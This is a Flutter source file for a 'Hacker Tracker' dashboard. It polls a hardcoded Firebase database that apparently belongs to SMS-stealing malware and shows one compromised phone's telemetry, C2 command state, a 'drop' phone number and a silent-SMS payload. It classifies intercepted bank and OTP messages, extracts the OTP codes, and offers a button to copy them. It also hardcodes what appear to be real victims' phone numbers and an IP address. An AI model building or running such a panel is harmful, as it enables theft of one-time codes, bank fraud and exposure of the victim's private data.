import 'dart:async';
import 'dart:convert';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(const HackerTrackerApp());
}

class HackerTrackerApp extends StatelessWidget {
  const HackerTrackerApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const CupertinoApp(
      title: 'Hacker Tracker · 03e768e104ef026d',
      debugShowCheckedModeBanner: false,
      theme: CupertinoThemeData(
        brightness: Brightness.dark,
        primaryColor: CupertinoColors.activeBlue,
        scaffoldBackgroundColor: CupertinoColors.black,
        barBackgroundColor: Color(0xCC18181A),
      ),
      home: MainTabScaffold(),
    );
  }
}

class MainTabScaffold extends StatefulWidget {
  const MainTabScaffold({super.key});

  @override
  State<MainTabScaffold> createState() => _MainTabScaffoldState();
}

class _MainTabScaffoldState extends State<MainTabScaffold> {
  final String deviceId = '03e768e104ef026d';
  final String firebaseBase = 'https://r-cha-222-default-rtdb.firebaseio.com';

  bool isLoading = true;
  bool isOnline = true;
  String battery = '71%';
  String ipAddress = '106.211.47.194';
  String phone = '+918433062983';
  String carrier = 'Airtel';
  String model = 'OnePlus CPH2467';
  String os = 'Android 15 (SDK 35)';
  String storage = '104GB';
  String command = 'forward status';
  String simSlot = '0';
  String ping = 'ping_magic_scan';
  String pong = 'pong';
  String dropPhone = '+919560241900';
  String silentSms = 'HDFCUPI ...';
  String lastSync = 'Just now';

  List<Map<String, dynamic>> allMessages = [];
  List<Map<String, dynamic>> filteredMessages = [];
  int selectedSegment = 0; // 0: All, 1: OTP, 2: Bank, 3: Carrier
  String searchQuery = '';
  Timer? refreshTimer;

  @override
  void initState() {
    super.initState();
    fetchTelemetry();
    refreshTimer = Timer.periodic(const Duration(seconds: 15), (_) => fetchTelemetry());
  }

  @override
  void dispose() {
    refreshTimer?.cancel();
    super.dispose();
  }

  Future<void> fetchTelemetry() async {
    try {
      final clientUri = Uri.parse('$firebaseBase/clients/$deviceId.json');
      final cmdUri = Uri.parse('$firebaseBase/commands/$deviceId.json');
      final userUri = Uri.parse('$firebaseBase/user_data/$deviceId.json');
      final msgUri = Uri.parse('$firebaseBase/messages/$deviceId.json');

      final responses = await Future.wait([
        http.get(clientUri).catchError((_) => http.Response('null', 500)),
        http.get(cmdUri).catchError((_) => http.Response('null', 500)),
        http.get(userUri).catchError((_) => http.Response('null', 500)),
        http.get(msgUri).catchError((_) => http.Response('null', 500)),
      ]);

      if (responses[0].statusCode == 200 && responses[0].body != 'null') {
        final clientData = json.decode(responses[0].body) as Map<String, dynamic>;
        setState(() {
          isOnline = clientData['status'] == true;
          battery = clientData['battery']?.toString() ?? '71%';
          ipAddress = clientData['ip_address']?.toString() ?? ipAddress;
          phone = clientData['mobNo']?.toString() ?? phone;
          carrier = clientData['service_provider']?.toString() ?? carrier;
          model = clientData['modelName']?.toString() ?? model;
          if (clientData['androidV'] != null) {
            os = 'Android ${clientData['androidV']} (SDK ${clientData['sdkV'] ?? 35})';
          }
          storage = clientData['storage']?.toString() ?? storage;

          final wh = clientData['webhookEvent'] as Map<String, dynamic>?;
          if (wh != null) {
            final check = wh['checkLiveness'] as Map<String, dynamic>?;
            if (check != null && check['text'] != null) {
              pong = check['text'].toString();
            }
            final sms = wh['sendSms'] as Map<String, dynamic>?;
            if (sms != null) {
              dropPhone = sms['to']?.toString() ?? dropPhone;
              silentSms = sms['message']?.toString() ?? silentSms;
            }
          }
        });
      }

      if (responses[1].statusCode == 200 && responses[1].body != 'null') {
        final cmdData = json.decode(responses[1].body) as Map<String, dynamic>;
        final chk = cmdData['checkLiveness'] as Map<String, dynamic>?;
        if (chk != null && chk['text'] != null) {
          setState(() {
            ping = chk['text'].toString();
          });
        }
      }

      if (responses[2].statusCode == 200 && responses[2].body != 'null') {
        final udData = json.decode(responses[2].body) as Map<String, dynamic>;
        setState(() {
          command = udData['command']?.toString() ?? command;
          simSlot = udData['simSlot']?.toString() ?? simSlot;
        });
      }

      if (responses[3].statusCode == 200 && responses[3].body != 'null') {
        final msgMap = json.decode(responses[3].body) as Map<String, dynamic>;
        parseMessages(msgMap);
      }

      setState(() {
        isLoading = false;
        final now = DateTime.now();
        lastSync = '${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}';
      });
    } catch (e) {
      // Fallback to local snapshot
      fallbackToLocalSnapshot();
    }
  }

  Future<void> fallbackToLocalSnapshot() async {
    try {
      final res = await http.get(Uri.parse('data/latest.json'));
      if (res.statusCode == 200) {
        final data = json.decode(res.body) as Map<String, dynamic>;
        final rawClient = data['raw']?['client'] ?? data['client'];
        if (rawClient != null) {
          setState(() {
            battery = rawClient['battery']?.toString() ?? battery;
            ipAddress = rawClient['ip_address']?.toString() ?? ipAddress;
            isOnline = rawClient['status'] == true;
          });
        }
      }
      final msgRes = await http.get(Uri.parse('data/messages_archive.json'));
      if (msgRes.statusCode == 200) {
        final msgData = json.decode(msgRes.body) as Map<String, dynamic>;
        final rawMsgs = msgData['messages'] as Map<String, dynamic>?;
        if (rawMsgs != null) parseMessages(rawMsgs);
      }
      setState(() {
        isLoading = false;
        lastSync = 'Snapshot';
      });
    } catch (_) {
      setState(() => isLoading = false);
    }
  }

  void parseMessages(Map<String, dynamic> raw) {
    final list = <Map<String, dynamic>>[];
    final otpRe = RegExp(r'\b(otp|code|pin|password|verification|verify)\b', caseSensitive: false);
    final numRe = RegExp(r'\b(\d{4,8})\b');
    final bankRe = RegExp(r'\b(upi|inr|rs\.?|debited|credited|balance|a/c|account|bank|pnb|sbi|hdfc|icici)\b', caseSensitive: false);

    raw.forEach((key, val) {
      if (val is Map<String, dynamic>) {
        final body = val['message']?.toString() ?? '';
        final sender = (val['sender']?.toString() ?? 'UNKNOWN').toUpperCase();
        final isOtp = otpRe.hasMatch(body);
        final isBank = bankRe.hasMatch(body) || sender.contains('PNB') || sender.contains('BANK');
        final isCarrier = sender.contains('AIRTEL') || sender.contains('JIO') || sender.contains('6500');

        String? extractedOtp;
        if (isOtp) {
          final m = numRe.firstMatch(body);
          if (m != null) extractedOtp = m.group(1);
        }

        list.add({
          'id': val['id']?.toString() ?? key,
          'sender': val['sender']?.toString() ?? 'UNKNOWN',
          'message': body,
          'time': val['dateTime']?.toString() ?? '',
          'isOtp': isOtp,
          'isBank': isBank,
          'isCarrier': isCarrier,
          'extractedOtp': extractedOtp,
        });
      }
    });

    list.sort((a, b) {
      final na = int.tryParse(a['id']);
      final nb = int.tryParse(b['id']);
      if (na != null && nb != null) return nb.compareTo(na);
      return b['id'].compareTo(a['id']);
    });

    setState(() {
      allMessages = list;
      applyMessageFilters();
    });
  }

  void applyMessageFilters() {
    setState(() {
      filteredMessages = allMessages.where((m) {
        if (selectedSegment == 1 && m['isOtp'] != true) return false;
        if (selectedSegment == 2 && m['isBank'] != true) return false;
        if (selectedSegment == 3 && m['isCarrier'] != true) return false;

        if (searchQuery.isNotEmpty) {
          final s = (m['sender'] as String).toLowerCase();
          final b = (m['message'] as String).toLowerCase();
          final t = (m['time'] as String).toLowerCase();
          return s.contains(searchQuery) || b.contains(searchQuery) || t.contains(searchQuery);
        }
        return true;
      }).toList();
    });
  }

  @override
  Widget build(BuildContext context) {
    return CupertinoTabScaffold(
      tabBar: CupertinoTabBar(
        backgroundColor: const Color(0xEE141416),
        activeColor: CupertinoColors.activeBlue,
        inactiveColor: CupertinoColors.systemGrey,
        items: [
          const BottomNavigationBarItem(
            icon: Icon(CupertinoIcons.device_phone_portrait),
            label: 'Overview',
          ),
          BottomNavigationBarItem(
            icon: Stack(
              clipBehavior: Clip.none,
              children: [
                const Icon(CupertinoIcons.chat_bubble_2_fill),
                if (allMessages.isNotEmpty)
                  Positioned(
                    top: -4,
                    right: -10,
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
                      decoration: BoxDecoration(
                        color: CupertinoColors.systemRed,
                        borderRadius: BorderRadius.circular(10),
                      ),
                      constraints: const Duration(milliseconds: 0).inMicroseconds == 0
                          ? const BoxConstraints(minWidth: 16)
                          : null,
                      child: Text(
                        '${allMessages.length}',
                        style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: CupertinoColors.white),
                        textAlign: TextAlign.center,
                      ),
                    ),
                  ),
              ],
            ),
            label: 'Messages',
          ),
          const BottomNavigationBarItem(
            icon: Icon(CupertinoIcons.bolt_fill),
            label: 'Commands',
          ),
          const BottomNavigationBarItem(
            icon: Icon(CupertinoIcons.clock_fill),
            label: 'Timeline',
          ),
        ],
      ),
      tabBuilder: (context, index) {
        switch (index) {
          case 0:
            return CupertinoPageScaffold(
              navigationBar: buildCupertinoNavBar('Overview'),
              child: buildOverviewTab(),
            );
          case 1:
            return CupertinoPageScaffold(
              navigationBar: buildCupertinoNavBar('Messages'),
              child: buildMessagesTab(),
            );
          case 2:
            return CupertinoPageScaffold(
              navigationBar: buildCupertinoNavBar('C2 Commands'),
              child: buildCommandsTab(),
            );
          case 3:
            return CupertinoPageScaffold(
              navigationBar: buildCupertinoNavBar('Activity Log'),
              child: buildTimelineTab(),
            );
          default:
            return const SizedBox.shrink();
        }
      },
    );
  }

  CupertinoNavigationBar buildCupertinoNavBar(String title) {
    return CupertinoNavigationBar(
      middle: Text(
        title,
        style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 17),
      ),
      leading: CupertinoButton(
        padding: EdgeInsets.zero,
        onPressed: () {
          Clipboard.setData(ClipboardData(text: deviceId));
          showCupertinoDialog(
            context: context,
            builder: (ctx) => CupertinoAlertDialog(
              title: const Text('Device ID Copied'),
              content: Text(deviceId),
              actions: [
                CupertinoDialogAction(
                  child: const Text('OK'),
                  onPressed: () => Navigator.pop(ctx),
                )
              ],
            ),
          );
        },
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                color: isOnline ? CupertinoColors.activeGreen : CupertinoColors.systemRed,
                shape: BoxShape.circle,
              ),
            ),
            const SizedBox(width: 5),
            const Text(
              '03e768e1',
              style: TextStyle(fontFamily: 'monospace', fontSize: 12, color: CupertinoColors.systemCyan),
            ),
          ],
        ),
      ),
      trailing: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(lastSync, style: const TextStyle(fontSize: 12, color: CupertinoColors.systemGrey)),
          const SizedBox(width: 8),
          CupertinoButton(
            padding: EdgeInsets.zero,
            onPressed: fetchTelemetry,
            child: const Icon(CupertinoIcons.arrow_clockwise, size: 20),
          ),
        ],
      ),
    );
  }

  Widget buildOverviewTab() {
    return SafeArea(
      child: ListView(
        padding: const EdgeInsets.symmetric(vertical: 16),
        children: [
          CupertinoListSection.insetGrouped(
            header: const Text('DEVICE VITALS'),
            backgroundColor: CupertinoColors.black,
            children: [
              CupertinoListTile(
                title: const Text('Connection Status'),
                trailing: Text(
                  isOnline ? 'Online (Active C2)' : 'Offline',
                  style: TextStyle(
                    fontWeight: FontWeight.bold,
                    color: isOnline ? CupertinoColors.activeGreen : CupertinoColors.systemRed,
                  ),
                ),
              ),
              CupertinoListTile(
                title: const Text('Battery Level'),
                trailing: Text(battery, style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
              ),
              CupertinoListTile(
                title: const Text('Cellular IP'),
                trailing: Text(ipAddress, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
              ),
              CupertinoListTile(
                title: const Text('Phone & Carrier'),
                trailing: Text('$phone ($carrier)'),
              ),
              CupertinoListTile(
                title: const Text('Model / Hardware'),
                trailing: Text(model),
              ),
              CupertinoListTile(
                title: const Text('Operating System'),
                trailing: Text(os),
              ),
              CupertinoListTile(
                title: const Text('Storage / SD Card'),
                trailing: Text('$storage (SD Card: Yes)'),
              ),
            ],
          ),
          CupertinoListSection.insetGrouped(
            header: const Text('C2 AUTO-RELAY GATEWAY'),
            backgroundColor: CupertinoColors.black,
            children: [
              const CupertinoListTile(
                title: Text('Assigned Role'),
                trailing: Text('C2 Auto-Relay Controller', style: TextStyle(color: CupertinoColors.systemOrange)),
              ),
              CupertinoListTile(
                title: const Text('Active Command'),
                trailing: Text('$command (Slot $simSlot)', style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
              ),
              CupertinoListTile(
                title: const Text('Liveness Handshake'),
                trailing: Text('$ping ⇄ $pong', style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.activeGreen)),
              ),
              CupertinoListTile(
                title: const Text('Drop Destination Phone'),
                trailing: Text(dropPhone, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemOrange)),
              ),
              CupertinoListTile(
                title: const Text('Silent SMS Payload'),
                subtitle: Text(silentSms, maxLines: 1, overflow: TextOverflow.ellipsis),
                trailing: const Text('Queued', style: TextStyle(color: CupertinoColors.systemGrey)),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget buildMessagesTab() {
    final otpsCount = allMessages.where((m) => m['isOtp'] == true).length;
    final bankCount = allMessages.where((m) => m['isBank'] == true).length;
    final carrierCount = allMessages.where((m) => m['isCarrier'] == true).length;

    return SafeArea(
      child: Column(
        children: [
          Padding(
            padding: const EdgeInsets.fromLTRB(16, 12, 16, 8),
            child: CupertinoSearchTextField(
              placeholder: 'Search sender, bank, OTP, text...',
              onChanged: (val) {
                searchQuery = val.trim().toLowerCase();
                applyMessageFilters();
              },
            ),
          ),
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
            child: SizedBox(
              width: double.infinity,
              child: CupertinoSlidingSegmentedControl<int>(
                groupValue: selectedSegment,
                children: {
                  0: Text('All (${allMessages.length})', style: const TextStyle(fontSize: 12)),
                  1: Text('🔑 OTPs ($otpsCount)', style: const TextStyle(fontSize: 12)),
                  2: Text('🏦 Bank ($bankCount)', style: const TextStyle(fontSize: 12)),
                  3: Text('📶 Airtel ($carrierCount)', style: const TextStyle(fontSize: 12)),
                },
                onValueChanged: (val) {
                  if (val != null) {
                    setState(() {
                      selectedSegment = val;
                      applyMessageFilters();
                    });
                  }
                },
              ),
            ),
          ),
          const SizedBox(height: 6),
          Expanded(
            child: filteredMessages.isEmpty
                ? const Center(child: Text('No messages found', style: TextStyle(color: CupertinoColors.systemGrey)))
                : ListView.builder(
                    itemCount: filteredMessages.length,
                    itemBuilder: (context, idx) {
                      final m = filteredMessages[idx];
                      return buildCupertinoMessageTile(m);
                    },
                  ),
          ),
        ],
      ),
    );
  }

  Widget buildCupertinoMessageTile(Map<String, dynamic> m) {
    Color avatarColor = CupertinoColors.systemGrey;
    if (m['isOtp'] == true) avatarColor = CupertinoColors.systemRed;
    else if (m['isBank'] == true) avatarColor = CupertinoColors.activeBlue;
    else if (m['isCarrier'] == true) avatarColor = CupertinoColors.systemPurple;

    final sender = m['sender'] as String;
    final initials = sender.replaceAll(RegExp(r'[^A-Za-z0-9]'), '');
    final shortInitials = initials.length >= 3 ? initials.substring(0, 3) : (initials.isNotEmpty ? initials : '??');

    return CupertinoButton(
      padding: EdgeInsets.zero,
      onPressed: () => showMessageActionSheet(m),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: const BoxDecoration(
          border: Border(bottom: BorderSide(color: Color(0x33545458), width: 0.5)),
        ),
        child: Row(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: avatarColor,
                shape: BoxShape.circle,
              ),
              alignment: Alignment.center,
              child: Text(
                shortInitials,
                style: const TextStyle(color: CupertinoColors.white, fontWeight: FontWeight.bold, fontSize: 12),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        sender,
                        style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: CupertinoColors.white),
                      ),
                      Text(
                        formatTime(m['time']),
                        style: const TextStyle(fontSize: 11, color: CupertinoColors.systemGrey),
                      ),
                    ],
                  ),
                  const SizedBox(height: 4),
                  if (m['extractedOtp'] != null)
                    Container(
                      margin: const EdgeInsets.only(bottom: 4),
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                      decoration: BoxDecoration(
                        color: CupertinoColors.systemRed.withOpacity(0.2),
                        border: Border.all(color: CupertinoColors.systemRed, width: 0.5),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: Text(
                        'OTP: ${m['extractedOtp']}',
                        style: const TextStyle(
                          fontFamily: 'monospace',
                          fontWeight: FontWeight.bold,
                          color: CupertinoColors.systemOrange,
                          fontSize: 11,
                        ),
                      ),
                    ),
                  Text(
                    m['message'] as String,
                    maxLines: 2,
                    overflow: TextOverflow.ellipsis,
                    style: const TextStyle(fontSize: 13, color: CupertinoColors.systemGrey, height: 1.3),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  void showMessageActionSheet(Map<String, dynamic> m) {
    showCupertinoModalPopup(
      context: context,
      builder: (ctx) => CupertinoActionSheet(
        title: Text('${m['sender']} · ${m['time']}', style: const TextStyle(fontWeight: FontWeight.bold)),
        message: Column(
          children: [
            const SizedBox(height: 8),
            Text(m['message'], style: const TextStyle(fontSize: 13, color: CupertinoColors.white)),
            if (m['extractedOtp'] != null) ...[
              const SizedBox(height: 12),
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: CupertinoColors.systemRed.withOpacity(0.15),
                  border: Border.all(color: CupertinoColors.systemRed),
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Text(
                  'Extracted OTP: ${m['extractedOtp']}',
                  style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold, fontSize: 16, color: CupertinoColors.systemOrange),
                ),
              ),
            ]
          ],
        ),
        actions: [
          if (m['extractedOtp'] != null)
            CupertinoActionSheetAction(
              onPressed: () {
                Clipboard.setData(ClipboardData(text: m['extractedOtp']));
                Navigator.pop(ctx);
              },
              child: const Text('Copy OTP Code'),
            ),
          CupertinoActionSheetAction(
            onPressed: () {
              Clipboard.setData(ClipboardData(text: m['message']));
              Navigator.pop(ctx);
            },
            child: const Text('Copy Message Text'),
          ),
        ],
        cancelButton: CupertinoActionSheetAction(
          onPressed: () => Navigator.pop(ctx),
          child: const Text('Done'),
        ),
      ),
    );
  }

  Widget buildCommandsTab() {
    return SafeArea(
      child: ListView(
        padding: const EdgeInsets.symmetric(vertical: 16),
        children: [
          CupertinoListSection.insetGrouped(
            header: const Text('REALTIME C2 CONTROLLER STATE'),
            backgroundColor: CupertinoColors.black,
            children: [
              CupertinoListTile(
                title: const Text('Active Command'),
                subtitle: Text(command, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
              ),
              CupertinoListTile(
                title: const Text('Relay SIM Slot'),
                trailing: Text(simSlot, style: const TextStyle(fontFamily: 'monospace')),
              ),
            ],
          ),
          CupertinoListSection.insetGrouped(
            header: const Text('LIVENESS HANDSHAKE'),
            backgroundColor: CupertinoColors.black,
            children: [
              CupertinoListTile(
                title: const Text('Server Ping'),
                trailing: Text(ping, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemCyan)),
              ),
              CupertinoListTile(
                title: const Text('Client Pong'),
                trailing: Text(pong, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.activeGreen)),
              ),
              const CupertinoListTile(
                title: Text('Handshake Status'),
                trailing: Text('Active & Live', style: TextStyle(color: CupertinoColors.activeGreen, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
          CupertinoListSection.insetGrouped(
            header: const Text('SILENT SMS WEBHOOK PAYLOAD'),
            backgroundColor: CupertinoColors.black,
            children: [
              CupertinoListTile(
                title: const Text('Destination Drop'),
                trailing: Text(dropPhone, style: const TextStyle(fontFamily: 'monospace', color: CupertinoColors.systemOrange)),
              ),
              CupertinoListTile(
                title: const Text('Silent Payload'),
                subtitle: Text(silentSms, style: const TextStyle(fontFamily: 'monospace', fontSize: 11)),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget buildTimelineTab() {
    return SafeArea(
      child: ListView(
        padding: const EdgeInsets.all(16),
        children: [
          _buildTimelineCard('2026-11-19 16:58', 'NEW_SMS_INTERCEPTED', 'Sony LIV OTP (2395) intercepted on device.'),
          _buildTimelineCard('2026-11-19 16:52', 'BATTERY_LEVEL_CHANGED', 'Battery level shifted from 74% to 71%.'),
          _buildTimelineCard('2026-11-19 16:49', 'INITIAL_TRACKER_RUN', 'Initialized automated surveillance tracking for 03e768e104ef026d.'),
        ],
      ),
    );
  }

  Widget _buildTimelineCard(String time, String type, String desc) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF1C1C1E),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: const Color(0x33545458), width: 0.5),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(type, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold, color: CupertinoColors.activeBlue)),
              Text(time, style: const TextStyle(fontSize: 11, color: CupertinoColors.systemGrey)),
            ],
          ),
          const SizedBox(height: 6),
          Text(desc, style: const TextStyle(fontSize: 13, color: CupertinoColors.white)),
        ],
      ),
    );
  }

  String formatTime(String timeStr) {
    if (timeStr.contains('|')) {
      return timeStr.split('|')[1].trim().toUpperCase();
    }
    return timeStr;
  }
}
